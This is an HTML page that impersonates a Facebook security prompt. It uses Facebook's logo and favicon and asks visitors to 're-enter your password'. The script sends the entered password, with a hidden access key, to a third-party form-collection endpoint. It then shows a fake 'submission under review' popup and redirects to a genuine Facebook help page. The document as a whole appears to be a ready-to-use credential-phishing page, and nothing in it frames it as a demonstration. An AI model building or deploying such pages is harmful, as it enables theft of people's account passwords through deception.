<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirmation Facebook Password</title>

  <!-- Facebook Favicon -->
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" type="image/x-icon">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    body {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
      text-align: center;
      width: 360px;
      position: relative;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 120px;
    }
    .header {
      margin-bottom: 20px;
      font-size: 18px;
      color: #333;
      font-weight: bold;
    }
    .form-group {
      margin-bottom: 25px;
      text-align: left;
      position: relative;
    }
    .form-group label {
      display: block;
      font-weight: bold;
      margin-bottom: 8px;
      font-size: 14px;
      color: #606770;
    }
    .input-wrapper {
      position: relative;
    }
    .form-group input {
      width: 100%;
      padding: 14px;
      padding-right: 40px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      font-size: 16px;
      color: #1c1e21;
      box-sizing: border-box;
    }
    .form-group input:focus {
      border-color: #1877f2;
      outline: none;
      box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
    }
    .eye-icon {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 20px;
      color: #606770;
      cursor: pointer;
      transition: color 0.3s ease;
    }
    .eye-icon:hover {
      color: #1877f2;
    }
    .submit-button {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
    }
    .submit-button:hover {
      background-color: #166fe5;
    }
    .error-message {
      color: #e74c3c;
      font-size: 14px;
      margin-top: 5px;
      margin-bottom: 15px;
      text-align: left;
    }

    /* Success Popup */
    .popup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .popup-content {
      background: #000;
      padding: 30px 20px;
      border-radius: 10px;
      text-align: center;
      width: 320px;
      position: relative;
      color: white;
    }
    .popup-content img {
      width: 70px;
      margin-bottom: 20px;
    }
    .popup-content h2 {
      font-size: 22px;
      margin-bottom: 10px;
    }
    .popup-content p {
      font-size: 14px;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .popup-content button {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    .popup-content button:hover {
      background-color: #166fe5;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
  </div>
  <div class="header">
    Facebook Security
  </div>
  <p>Please re-enter your password to complete this request.</p>
  <form id="passwordForm" action="https://submit-form.com/llO49GMfA" method="POST">
    <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
    <div class="form-group">
      <label for="password">Password</label>
      <div class="input-wrapper">
        <input type="password" id="password" name="password" placeholder="Enter your password" required>
        <i class="eye-icon fas fa-eye" id="togglePassword"></i>
      </div>
      <span id="error-message" class="error-message"></span>
    </div>
    <button type="submit" class="submit-button">Submit</button>
  </form>
</div>

<!-- Popup -->
<div id="successPopup" class="popup-overlay">
  <div class="popup-content">
    <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success">
    <h2>Successfully</h2>
    <p>We are currently reviewing your submission and will notify you via email within approximately 24 hours.</p>
    <button id="doneButton">Done</button>
  </div>
</div>

<script>
  // Password show/hide toggle
  document.getElementById('togglePassword').addEventListener('click', function() {
    var passwordField = document.getElementById('password');
    var eyeIcon = this;
    if (passwordField.type === 'password') {
      passwordField.type = 'text';
      eyeIcon.classList.remove('fa-eye');
      eyeIcon.classList.add('fa-eye-slash');
    } else {
      passwordField.type = 'password';
      eyeIcon.classList.remove('fa-eye-slash');
      eyeIcon.classList.add('fa-eye');
    }
  });

  // Form submit
  document.getElementById('passwordForm').addEventListener('submit', function(event) {
    event.preventDefault();
    var passwordField = document.getElementById('password');
    var errorMessage = document.getElementById('error-message');

    if (passwordField.value.length < 6) {
      errorMessage.textContent = 'Password must be at least 6 characters long.';
    } else {
      errorMessage.textContent = '';

      var formData = new FormData(this);
      fetch(this.action, {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(response => {
        if (response.ok) {
          document.getElementById('successPopup').style.display = 'flex';
        } else {
          errorMessage.textContent = 'There was an error. Please try again.';
        }
      })
      .catch(() => {
        errorMessage.textContent = 'There was an error. Please try again.';
      });
    }
  });

  // Done button click
  document.getElementById('doneButton').addEventListener('click', function() {
    window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc';
  });
</script>

</body>
</html>
